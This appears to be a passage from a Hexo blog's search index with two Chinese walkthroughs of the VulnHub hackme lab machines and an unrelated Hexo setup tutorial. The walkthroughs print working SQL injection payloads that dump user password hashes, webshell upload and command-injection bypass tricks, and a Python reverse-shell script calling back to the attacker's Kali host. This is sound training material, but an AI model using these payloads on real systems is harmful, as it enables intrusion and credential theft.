        <content type="html"><![CDATA[<p><strong>备注：</strong>文章是从自己csdn博客上移过来的，图片中可能存在水印的情况</p><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><p>靶机下载</p><blockquote><p><a href="https://vulnhub.com/entry/hackme-2,618/">hackme: 2 ~ VulnHub</a></p></blockquote><pre class="line-numbers language-none"><code class="language-none">攻击机kali：192.168.12.144靶机：192.168.12.163<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h3><p>2.1 主机发现，发现主机<code>ip:192.168.12.163</code></p><pre class="line-numbers language-none"><code class="language-none">namp 192.168.12.1&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/ed54/2-1.jpg" class><p>2.2 发现端口80，22端口开放；对80端口进行访问</p><img src="/post/ed54/2-2.jpg" class><p>2.3 对站点目录进行扫描</p><pre class="line-numbers language-none"><code class="language-none">dirsearch -u &quot;http:&#x2F;&#x2F;192.168.12.163&#x2F;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/ed54/2-3.jpg" class><img src="/post/ed54/2-4.jpg" class><ol start="2"><li>4网站指纹识别</li></ol><pre class="line-numbers language-none"><code class="language-none">whatweb http:&#x2F;&#x2F;192.168.12.163<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/ed54/2-5.jpg" class><h3 id="3-漏洞挖掘"><a href="#3-漏洞挖掘" class="headerlink" title="3. 漏洞挖掘"></a>3. 漏洞挖掘</h3><p>3.1 通过注册登录进入</p><img src="/post/ed54/3-1.jpg" class><p>3.2 可能存在sql注入，用sqlmap失败，进行手工注入</p><blockquote><p>输入：<br>L   –&gt;返回信息猜测这里存在模糊查询<br>Linux%’ and ‘123’ like ‘1   -&gt;成功返回信息</p></blockquote><p>3.3 构造payload进行注入，爆破数据库</p><pre class="line-numbers language-none"><code class="language-none">Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;database&#x2F;**&#x2F;(),&#39;2&#39;,&#39;3发现数据库：webapp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/ed54/3-2.jpg" class><p>3.4 继续爆破表名，字段名，字段内的数据</p><pre class="line-numbers language-none"><code class="language-none">表名：Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(table_name),&quot;2&quot;,&quot;3&quot;&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#39;webapp字段名：Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(column_name),&quot;2&quot;,&quot;3&quot;&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x2F;**&#x2F;like&#x2F;**&#x2F;&#39;users字段内数据：Linux%&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;group_concat(user),&#39;2&#39;,group_concat(pasword)&#x2F;**&#x2F;from&#x2F;**&#x2F;users&#x2F;**&#x2F;where&#x2F;**&#x2F;1&#x2F;**&#x2F;like&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/ed54/3-3.jpg" class><img src="/post/ed54/3-4.jpg" class><img src="/post/ed54/3-5.jpg" class><p>3.5 根据上面获取的用户密码，利用前面md5破解网站破解密码</p><blockquote><p>用户：superadmin<br>密码：2386acb2cf356944177746fc92523983<br>破解：Uncrackable</p></blockquote><img src="/post/ed54/3-6.jpg" class><p>3.6 利用破解的密码，进行登录</p><img src="/post/ed54/3-7.jpg" class><p>3.7 进行文件上传漏洞的尝试</p><blockquote><p>直接上传木马文件 —-》失败<br>修改后缀为jpg —&gt;访问失败–蚁剑连接不上<br>上传的jpg，利用bp进行修改后缀，上传显示成功，页面访问失败</p></blockquote><img src="/post/ed54/3-8.jpg" class><p>3.8 尝试命令注入漏洞</p><img src="/post/ed54/3-9.jpg" class><p>3.9 填写数据，利用bp抓包，修改数据</p><blockquote><p>system(‘ls’)</p></blockquote><img src="/post/ed54/3-10.jpg" class><img src="/post/ed54/3-11.jpg" class><p>3.10 查看文件上传php文件</p><blockquote><p>cat${IFS}welcomeadmin.php<br>文件上传的路径为：&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;</p><img src="/post/ed54/3-12.jpg" class></blockquote><p>命令执行中空格绕过方法</p><blockquote><p>&lt;   –&gt;   重定向，如cat&lt;flag.php<br>&lt;&gt;       –&gt;   重定向，如cat&lt;&gt;flag.php<br>%09  –&gt;   需要php环境，如cat%09flag.php<br>${IFS} –&gt;   单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名，如cat${IFS2}flag.php<br>$IFS$9  –&gt;   后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php</p></blockquote><h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h3><p>4.1 结合命令执行漏洞和文件上传漏洞，将前面上传的inj.jpg转换成phin.php文件，再使用蚁剑进行连接</p><blockquote><p>system(‘mv${IFS}&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;inj.jpg${IFS}&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;year2020&#x2F;phin.php’)</p></blockquote><p>访问页面</p><img src="/post/ed54/4-1.jpg" class><p>蚁剑进行连接</p><img src="/post/ed54/4-2.jpg" class><p>4.2 利用脚本,通过蚁剑上传执行</p><blockquote><p>import socket,subprocess,os<br>s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.connect((“192.168.12.144”,8989))<br>os.dup2(s.fileno(),0)<br>os.dup2(s.fileno(),1)<br>os.dup2(s.fileno(),2)<br>p&#x3D;subprocess.call([“&#x2F;bin&#x2F;bash”,”-i”])</p></blockquote><p>4.3 kali开启监听</p><blockquote><p>nc -lvvp 8989</p></blockquote><img src="/post/ed54/4-3.jpg" class><h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h3><p>5.1 在&#x2F;home&#x2F;legacy路径下发现二进制文件touchmenot，执行二进制文件</p><img src="/post/ed54/5-1.jpg" class>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> 网安 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶机-Hackeme1</title>
      <link href="/post/b990.html"/>
      <url>/post/b990.html</url>
      
        <content type="html"><![CDATA[<p><strong>备注：</strong>文章是从自己csdn博客上移过来的，图片中可能存在水印的情况</p><h3 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1. 环境配置"></a>1. 环境配置</h3><p>1.1 Hackeme1下载位置</p><blockquote><p><a href="https://vulnhub.com/entry/hackme-1,330/">hackme: 1 ~ VulnHub</a></p></blockquote><p>1.2 环境相关信息</p><pre class="line-numbers language-none"><code class="language-none">kali攻击机：192.168.12.144靶机：192.168.12.162<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h3><p>2.1 进行主机发现，发现靶机<code>IP：192.168.12.162</code>,同时开放80端口。</p><pre class="line-numbers language-none"><code class="language-none">nmap 192.168.12.1&#x2F;24arp-scan -l <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/b990/21.png" class><p>2.2 访问靶机的80端口，一个登录页面。</p><img src="/post/b990/2-2.jpg" class><p>2.3 对网站进行目录扫描</p><p>（1）利用dirb工具对网站进行扫描。</p><pre class="line-numbers language-none"><code class="language-none">dirb http:&#x2F;&#x2F;192.168.12.162&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/b990/2-3.jpg" class><p>（2）利用dirsearch工具对网站进行扫描</p><pre class="line-numbers language-none"><code class="language-none">dirsearch -u &quot;http:&#x2F;&#x2F;192.168.12.162&#x2F;&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/b990/2-4.jpg" class><p>（3）利用gobuster工具对网站进行扫描</p><pre class="line-numbers language-none"><code class="language-none">gobuster dir -e -w &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt -u http:&#x2F;&#x2F;192.168.12.162#-w 指定字典；-u 指定网站；-x 指定文件的后缀<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/b990/2-5.jpg" class><h3 id="3-漏洞挖掘"><a href="#3-漏洞挖掘" class="headerlink" title="3. 漏洞挖掘"></a>3. 漏洞挖掘</h3><p>3.1 发现登录页面，进行查看发现可以注册用户</p><img src="/post/b990/3-1.jpg" class><p>3.2 进入注册页面，注册个用户</p><img src="/post/b990/3-2.jpg" class><p>3.3 通过注册的用户进行登录，点击search，发现一些数据。</p><img src="/post/b990/3-3.jpg" class><p>3.4 对搜索框进行sql注入，存在单引号的字符注入。</p><pre class="line-numbers language-none"><code class="language-none">### 输入：Linux OS   &#x2F;&#x2F;正常Linux OS&#39; &#x2F;&#x2F;不正常Linux OS&#39; and 1&#x3D;1 # &#x2F;&#x2F;正常Linux OS&#39; and 1&#x3D;2 # &#x2F;&#x2F;不正常<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/post/b990/3-4.jpg" class><img src="/post/b990/3-5.jpg" class><p>3.5 判断字段数，根据判断字段数为3。</p><pre class="line-numbers language-none"><code class="language-none">Linux OS&#39; order by 1#          &#x2F;&#x2F;正常Linux OS&#39; order by 4#         &#x2F;&#x2F;不正常Linux OS&#39; order by 3#         &#x2F;&#x2F;正常<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/post/b990/3-6.jpg" class><img src="/post/b990/3-7.jpg" class><p>3.6 判断注入的位置</p><pre class="line-numbers language-none"><code class="language-none">Linux OS&#39; and 1&#x3D;2 union select 11,22,33#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/b990/3-8.jpg" class><p>3.7 爆破数据库名，用户名，版本号</p><pre class="line-numbers language-none"><code class="language-none">Linux OS&#39; and 1&#x3D;2 union select database(),user(),version()#数据库名为：webapphacking<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/b990/3-9.jpg" class><p>3.8 爆数据库中的表名</p><pre class="line-numbers language-none"><code class="language-none">Linux OS&#39; and 1&#x3D;2 union select 1, group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;webapphacking&#39;#表名：books,users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/b990/3-10.jpg" class><p>3.9 爆字段名</p><pre class="line-numbers language-none"><code class="language-none">Linux OS&#39; and 1&#x3D;2 union select 1, group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/b990/3-11.png" class><p>3.10 爆字段内的信息user\pasword</p><pre class="line-numbers language-none"><code class="language-none">Linux OS&#39; and 1&#x3D;2 union select group_concat(user),group_concat(pasword),3 from users#用户：superadmin密码：2386acb2cf356944177746fc92523983<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/post/b990/3-12.jpg" class><p>3.11 利用md5破解网站对密码进行破解</p><blockquote><p>破解网站：</p><p><a href="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a></p></blockquote><img src="/post/b990/3-13.jpg" class><p>3.12 利用解密的账号密码登录，发现文件上传</p><img src="/post/b990/3-14.jpg" class><h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h3><p>4.1 直接上传木马文件—》成功</p><img src="/post/b990/4-1.jpg" class><p>4.2 访问页面，蚁剑连接</p><img src="/post/b990/4-2.jpg" class><img src="/post/b990/4-3.jpg" class><p>4.3 编写反弹shell的脚本，shell.py，并利用蚁剑上传并执行</p><pre class="line-numbers language-none"><code class="language-none">import socket,subprocess,oss&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;192.168.12.144&quot;,8989))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4.4 kali攻击机开启 端口监听</p><img src="/post/b990/4-4.jpg" class><p>4.5 执行反弹脚本,kali上接受反弹的shell</p><img src="/post/b990/4-5.jpg" class><img src="/post/b990/4-6.jpg" class><h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h3><p>5.1 在&#x2F;home&#x2F;legacy路径下发现<a href="https://so.csdn.net/so/search?q=%E4%BA%8C%E8%BF%9B%E5%88%B6&spm=1001.2101.3001.7020">二进制</a>文件touchmenot，执行二进制文件</p><img src="/post/b990/5-1.jpg" class>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> 网安 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo搭建博客</title>
      <link href="/post/2c1.html"/>
      <url>/post/2c1.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h3><p>​需要安装两个工具：Git工具和node.js</p><h4 id="1-1-Git工具"><a href="#1-1-Git工具" class="headerlink" title="1.1 Git工具"></a>1.1 Git工具</h4><p>1.1.1 下载地址，我是采用官网下载地址。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Git官网下载：https://git-scm.com/国内镜像下载：https://npm.taobao.org/mirrors/git-for-windows/v2.22.0.windows.1/Git-2.22.0-64-bit.exe国内其他版本下载：https://npm.taobao.org/mirrors/git-for-windows/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/post/2c1/1.png" class><p>1.1.2 git工具的安装没有特别需要注意的地方，只需要确定好自己想要安装的位置。打开命令行终端，输入下面命令查看是否安装成功。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/2c1/2.png" class><h4 id="1-2-Nodejs安装"><a href="#1-2-Nodejs安装" class="headerlink" title="1.2 Nodejs安装"></a>1.2 Nodejs安装</h4><p>1.2.1 下载地址，我查看教程最好是下载安装包，而不是压缩包</p><pre class="line-numbers language-none"><code class="language-none">官网下载：http:&#x2F;&#x2F;nodejs.cn&#x2F;download&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/post/2c1/3.png" class><p>1.2.2  Nodejs安装需要注意的点就是需要配置下面的图，将这些环境选择上</p><blockquote><ul><li><code>Node.js runtime</code> ：表示运行环境</li><li><code>npm package manager</code>：表示npm包管理器</li><li><code>online documentation shortcuts</code> ：在线文档快捷方式</li><li><code>Add to PATH</code>：添加到环境变量</li></ul></blockquote><img src="/post/2c1/4.png" class><p>1.2.3 其余的基本上默认下一步就可以，同时可以用下面的命令进行查看安装是否成功。</p><blockquote><p>新版的node安装的同时也是安装npm（nodejs的包管理器）</p></blockquote><pre class="line-numbers language-none"><code class="language-none">node -vnpm -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/post/2c1/2-3.png" class><p>1.2.4 npm的一些常用命令。</p><pre class="line-numbers language-none"><code class="language-none">npm -v：查看npm安装的版本。npm init：会引导你建立一个package.json文件，包括名称、版本、作者等信息。npm list：查看当前目录下已安装的node包。npm ls：查看当前目录下已安装的node包。npm install moduleNames：安装Node模块到本地目录node_modules下。npm install &lt; name &gt; -g：将包安装到全局环境中。npm install &lt; name &gt; --save：安装的同时，将信息写入package.json中，项目路径中若是有package.json文件时，直接使用npm install方法就能够根据dependencies配置安装全部的依赖包，这样代码提交到git时，就不用提交node_modules这个文件夹了。npm install &lt; name&gt; --save-dev：安装的同时，将信息写入package.json中项目路径中若是有package.json文件时，直接使用npm install方法就能够根据devDependencies配置安装全部的依赖包，这样代码提交到git时，就不用提交node_modules这个文件夹了。npm uninstall moudleName：卸载node模块。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-3-nodejs环境变量配置"><a href="#1-3-nodejs环境变量配置" class="headerlink" title="1.3 nodejs环境变量配置"></a>1.3 nodejs环境变量配置</h4><p>1.3.1 在nodejs的根目录下创建两个文件夹”node_global“和”node_cache“。</p><p>1.3.2 打开cmd命令行（最好用管理员权限打开，避免报错），执行下面的命令</p><pre class="line-numbers language-none"><code class="language-none">npm config set prefix &quot;node_global的绝对路径&quot;npm config set cache &quot;node_cache的绝对路径&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>1.3.3 配置新建系统环境变量NODE_PATH以及将其写到path之中</p><img src="/post/2c1/3-2.png" class><img src="/post/2c1/3-3.png" class><p>1.3.4 npm安装模块默认镜像源是国外，设置成国内镜像源</p><pre class="line-numbers language-none"><code class="language-none">npm config set registry https:&#x2F;&#x2F;registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​这里有个我认为的坑点，就是下载cnpm代替默认的npm，但是后面安装模块都是npm，没有必要下cnpm。</p><pre class="line-numbers language-none"><code class="language-none">cnpm下载：npm install -g cnpm --registry&#x3D;https:&#x2F;&#x2F;registry.npmmirror.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-4-Git工具和Nodejs安装参考文章"><a href="#1-4-Git工具和Nodejs安装参考文章" class="headerlink" title="1.4 Git工具和Nodejs安装参考文章"></a>1.4 Git工具和Nodejs安装参考文章</h4><blockquote><p><a href="https://blog.csdn.net/weixin_44893902/article/details/121788104?ops_request_misc=%7B%22request_id%22:%22168769282016782425191134%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168769282016782425191134&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-121788104-null-null.142%5Ev88%5Ekoosearch_v1,239%5Ev2%5Einsert_chatgpt&utm_term=nodejs%E5%AE%89%E8%A3%85%E5%8F%8A%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE&spm=1018.2226.3001.4187">(84条消息) node.js安装及环境配置超详细教程【Windows系统安装包方式】_node安装配置_明金同学的博客-CSDN博客</a></p><p><a href="https://hexoscript.gitbook.io/hexo-script/v/1.3-1/shi-yong-bu-zhou/yi-jian-an-zhuang-hexo-bo-ke">一键安装hexo博客 - hexo-script使用文档 (gitbook.io)</a></p></blockquote><h4 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h4><p>1.开始的教程缺少环境配置（上面的1.3），nodejs的一些环境配置没有完全</p><p>解决方法：找了一篇其他人博客解决</p><h3 id="2-Hexo安装和配置出现的问题"><a href="#2-Hexo安装和配置出现的问题" class="headerlink" title="2.Hexo安装和配置出现的问题"></a>2.Hexo安装和配置出现的问题</h3><h4 id="2-1-Hexo安装"><a href="#2-1-Hexo安装" class="headerlink" title="2.1 Hexo安装"></a>2.1 Hexo安装</h4><p>2.1.1 前面环境安装后，新建一个文件夹专门用来写博客相关文件的文件夹，在这个文件夹下打开前面安装的git(在文件夹下右键打开 git bash)，输入下面的命令进行安装。</p><pre class="line-numbers language-none"><code class="language-none">npm install -g hexo-clihexo -v &#x2F;&#x2F;查看安装是否成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><u>这里我出现问题：</u></p><p>   （1）发现输入hexo -v后没成功回显，开始以为没成功，后来发现要配置一下它的环境变量。</p><pre class="line-numbers language-none"><code class="language-none">### 在path中添加下面的路径，你的node_global路径D:\blog\nodejs\node_global<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​（2）有些文章要去github上下install.sh的工具来下hexo—-&gt;可是我没成功就采用上面的方法。</p><p>2.1.2 初始化hexo,去你准备存放博客相关文件的文件夹下</p><pre class="line-numbers language-none"><code class="language-none">hexo init <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.1.3 hexo的一些简单命令</p><pre class="line-numbers language-none"><code class="language-none">hexo g&#x2F;&#x2F;将写好的文件进行打包hexo s&#x2F;&#x2F;本地开启web服务，查看你当前搭建的博客并进行调整hexo clean&#x2F;&#x2F;清除已经打包好的文件hexo new post 文件名&#x2F;&#x2F;创建新文章hexo new page 页面名&#x2F;&#x2F;创建新页面hexo d&#x2F;&#x2F;将本地弄好的博客上传到github上<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><blockquote><p><a href="https://blog.csdn.net/sinat_37781304/article/details/82729029?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-82729029-blog-121901433.235%5Ev35%5Epc_relevant_anti_vip&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-82729029-blog-121901433.235%5Ev35%5Epc_relevant_anti_vip&utm_relevant_index=2">(84条消息) hexo史上最全搭建教程_zjufangzh的博客-CSDN博客</a></p></blockquote><h3 id="3-博客简单配置和上传"><a href="#3-博客简单配置和上传" class="headerlink" title="3. 博客简单配置和上传"></a>3. 博客简单配置和上传</h3><p>3.1 需要注意的点：创建一个和你用户名相同的仓库，后面加.github.io，只有这样，将来要部署到GitHub page的时候，才会被识别，也就是xxxx.github.io，其中xxx就是你注册GitHub的用户名</p><p>3.2 配置文件 <code>_config.yml</code>文件如下</p><pre class="line-numbers language-none"><code class="language-none">deploy:  type: git  repo: 你创建的仓库地址.git&#x2F;&#x2F;例如：https:&#x2F;&#x2F;github.com&#x2F;Liduan0&#x2F;Liduan0.github.io。git  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>3.3 安装部署命令</p><pre class="line-numbers language-none"><code class="language-none">npm install hexo-deployer-git --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.4 使用前面的hexo基本命令进行文章的部署</p><pre class="line-numbers language-none"><code class="language-none">hexo c &#x2F;&#x2F;清除打包好的文件hexo g &#x2F;&#x2F;重新打包文件，生成静态文章hexo d&#x2F;&#x2F;部署文章上去<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>参考文章</p><blockquote><p>[(84条消息) hexo史上最全搭建教程_zjufangzh的博客-CSDN博客](</p></blockquote><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>基本上一个简单博客搭建完成，后续的模板配置，不同模板配置都不一样需要自己根据文档进行配置。但是这里写下我配置模板过程中的一些问题和解决方法提供给需要的人进行参考。</p><p><strong>问题描述</strong>：配置都是按照模板上的文档进行配置，但是出现找不到页面的情况。</p><p>网上文章分析原因：</p><p>（1）配置不全导致无法找到页面；</p><p>（2）配置出错导致无法找到页面；</p><p>（3）多刷新几次就会出来。</p><p><strong>解决方法</strong>：我专门去生成静态文件的目录下，即文件夹【public】查看是否有相应的页面，都是存在的，刷新n次后还是没出来。后来直接将配置的js文件换个名字，重新调用成新命名的文件才将页面弄出来。</p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
